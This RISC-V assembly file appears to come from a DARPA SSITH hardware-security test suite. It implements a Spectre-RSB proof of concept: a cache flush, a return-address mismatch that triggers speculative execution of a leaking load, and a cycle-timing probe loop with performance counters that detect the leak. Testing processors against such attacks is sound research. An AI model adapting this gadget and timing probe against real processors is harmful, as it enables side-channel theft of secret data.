/*-
 * SPDX-License-Identifier: BSD-2-Clause
 *
 * Copyright (c) 2021 Franz Fuchs
 * All rights reserved.
 *
 * This software was developed by SRI International and the University of
 * Cambridge Computer Laboratory (Department of Computer Science and
 * Technology) under DARPA contract HR0011-18-C-0016 ("ECATS"), as part of the
 * DARPA SSITH research programme.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include "../hpm_macros.h"

.text

/*
Spectre-RSB

It calls a function that fetches its return
address from the stack and jumps there. Therefore,
the Return Stack Buffer (RSB) does not hold the same
value as the software stack. The microprocessor will predict
the jump going back to ras_change_frame, but the
actual location should be target_function.

load to: 0x0000000080020480
*/

spec_rsb:

    lla s2, spec_arr

    // write return address to ret_val
    lla s3, ret_val
    lla s4, target_function
    sd s4, 0(s3)

    // call flush function
    jal ra, flush

    // prepare hardware performance monitoring
    // do counting of load request sent by the CPU
    HPM_SELECT_EVENT(3, 0x30)
    // read value of counter 3 and store it to s10
    HPM_M_READ_X (s10, 3)

    jal ra, change_funct

    // to be executed speculatively
    // leak value stored in t2
    add t2, s2, t2
    ld t5, 0(t2)

    .rept 0x20
    nop
    .endr

target_function:

    // read value of counter 3 and store it to t2
    HPM_M_READ_X (s11, 3)


probe:

#ifdef VCU_118
  li t2, 0xc0020200
  li t6, 0xc0005000
#else
  li t2, 0x80020200
  li t6, 0x80005000
#endif

add t4, x0, x0
addi t5, x0, 16

probe_loop:
  rdcycle t0
  ld t3, 0(t2)
  rdcycle t1
  sub t1, t1, t0
  sd t1, 0(t6)
  addi t2, t2, 0x40
  addi t6, t6, 8
  addi t4, t4, 1
  blt t4, t5, probe_loop
  nop
  nop

    // if successful, we expect 2 loads to have happened
    // one architectural load that loads ret_val
    // one transient load that leaks the value in t2
    HPM_TEST(s10, s11, 2)

    // the target function is an idle function
    add t4, x0, x0
    beq t4, x0, target_function

    .rept 0x20
    nop
    .endr

change_funct:

    // load another value into ra
    // and return to it
    // this value must not be cached
    // on order to get a large miss window

    li t2, 0x400
    lla t4, ret_val
    ld ra, 0(t4)
    jalr x0, ra


flush:
    // flushes the entire caches
    // we expect the CACHE_TEST configuration
    // caches are 2 way and 8KB
    // we only need to flush cash lines (64 bytes) and not double-words
    // 8KB = 8192 bytes, we need to flush 8192/64=128 lines
#ifdef VCU_118
    li t0, 0xc0010000
#else
    li t0, 0x80010000
#endif
    li t1, 16384
    add t0, t0, t1
    add t1, t0, t1

flush_loop:
    ld t2, 0(t0)
    addi t0, t0, 64
    blt t0, t1, flush_loop
    jalr x0, ra

.data

ret_val:
  // cache line 0 and 1
#ifdef VCU_118
  .dword 0x00000000c0000010
#else
  .dword 0x0000000080000010
#endif
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000

spec_arr:
  // cache line 2 and 3
  .dword 0xfffffffffffffff0
  .dword 0xfffffffffffffff1
  .dword 0xfffffffffffffff2
  .dword 0xfffffffffffffff3
  .dword 0xfffffffffffffff4
  .dword 0xfffffffffffffff5
  .dword 0xfffffffffffffff6
  .dword 0xfffffffffffffff7
  .dword 0xfffffffffffffff8
  .dword 0xfffffffffffffff9
  .dword 0xfffffffffffffffa
  .dword 0xfffffffffffffffb
  .dword 0xfffffffffffffffc
  .dword 0xfffffffffffffffd
  .dword 0xfffffffffffffffe
  .dword 0xffffffffffffffff

.section .tohost , "adw"

tohost:
  .dword 0x0000000000000000
